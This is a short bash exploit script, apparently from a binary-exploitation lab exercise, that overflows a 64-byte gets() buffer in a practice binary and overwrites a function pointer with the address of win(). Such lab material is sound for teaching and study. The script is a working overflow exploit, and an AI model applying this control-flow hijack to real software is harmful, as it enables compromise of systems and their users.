#!/usr/bin/env bash
# ex03 — gets() overflow overwrites a function pointer then calls it
# win() is at 0x08048424. Buffer is 64 bytes; fp sits right after.
# We overflow 64 bytes then write &win in little-endian.

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }

echo "[*] ex03 — overwrite function pointer with &win via gets()"
echo "[*] win() : $(nm "$BIN" | awk '/ T win$/{print $1}')"
echo ""

python3 -c "
import sys, struct
sys.stdout.buffer.write(b'A'*64 + struct.pack('<I', 0x08048424) + b'\n')
" | "$BIN"

echo ""
echo "[*] done."
